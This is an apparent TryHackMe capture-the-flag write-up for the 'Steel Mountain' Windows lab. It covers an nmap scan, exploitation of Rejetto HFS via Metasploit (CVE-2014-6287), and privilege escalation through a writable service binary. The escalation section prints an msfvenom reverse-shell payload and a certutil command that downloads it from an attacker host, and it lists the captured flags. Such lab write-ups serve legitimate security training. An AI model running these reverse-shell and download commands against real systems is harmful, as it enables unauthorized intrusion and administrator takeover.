# steelmountain

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy / Medium |
| **Date** | 2026-07-29 |
| **Author** | Sytrus101 |
| **Tags** | `enumeration` `privesc` |
| **Flags** | user.txt · root.txt |
---

## 1. Reconnaissance

### Port scan
# Nmap 7.99 scan initiated Wed Jul 29 12:43:32 2026 as: /usr/lib/nmap/nmap --privileged -A -oN nmap/steel_mountain.txt --append 10.66.173.131
Nmap scan report for 10.66.173.131
Host is up (0.042s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2: 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2026-07-28T16:36:32
|_Not valid after:  2027-01-27T16:36:32
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2026-07-29T16:44:39+00:00
|_ssl-date: 2026-07-29T16:44:44+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2012
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
OS details: Microsoft Windows Server 2012 or 2012 R2
Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2: 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:04:57:03:6b:45 (unknown)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-07-29T16:44:39
|_  start_date: 2026-07-29T16:35:00

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   47.96 ms 192.168.128.1
2   ...
3   39.60 ms 10.66.173.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 29 12:44:45 2026: 1 IP address (1 host up) scanned in 72.56 seconds

**What stood out:**
HTTP File server Port 8080
---

## 2. Enumeration

### Service: HTTP (port 8080)

```bash
Findings: Rejetto HTTP file server
---

## 3. Initial foothold

**Vulnerability:**
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) CVE: 2014-6287

**How I exploited it:**

```bash
msf exploit(windows/http/rejetto_hfs_exec) 
```

**user.txt**

```
b04763b6fcf51fcd7c13abc7db4fd365
```

---

## 4. Privilege escalation

### Enumeration

```bash
# on the target
./PowerUp.ps1```
**What I Found:**
ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

### Exploitation

**Vector:** AdvancedSystemCare9 is open for the user to stop and start

```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.117 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
certutil -urlcache -f http://192.168.150.117:80/Advanced.exe
Hosted the file from a webserver to download into the powershell directory area

# the privesc commands
```
Replacing the Advanced SystemCare9 file with the msfvenom file allowed me to start a reverse shell with Administrator privileges
**root.txt**

```
9af5f314f57607c00fd09803a587db80
```

---
